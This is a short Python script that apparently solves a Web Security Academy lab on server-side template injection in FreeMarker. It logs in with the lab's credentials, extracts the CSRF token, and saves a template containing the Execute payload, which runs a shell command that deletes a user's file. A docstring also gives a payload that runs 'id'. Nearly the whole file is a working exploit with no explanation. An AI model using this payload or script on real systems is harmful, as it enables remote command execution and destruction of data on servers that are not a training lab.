'''
Freemarker template 

${"freemarker.template.utility.Execute"?new()("id")}

'''

import requests
from bs4 import BeautifulSoup

url = "https://acd41f091fbc5392c0fc3ec0002c0051.web-security-academy.net"

def  get_csrf(text):
	soup = BeautifulSoup(text, "html.parser")
	for i in soup.find_all('input'):
		if i.get('name') == "csrf":
			csrf = i.get('value')
	return csrf

def slove(url):
	s = requests.session()

	r1 = s.get(url+"/login")
	c1 = get_csrf(r1.text)

	data = {"csrf": c1, "username": "content-manager", "password" :"C0nt3ntM4n4g3r"}
	r2 = s.post(url+"/login", data=data)
	c2 = get_csrf(r2.text)

	payload = '${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}'
	data2 = {"csrf" : c2, "template": payload, "template-action": "save"} 
	exploit = s.post(url + "/product/template?productId=1", data=data2 )

	print(exploit)

slove(url)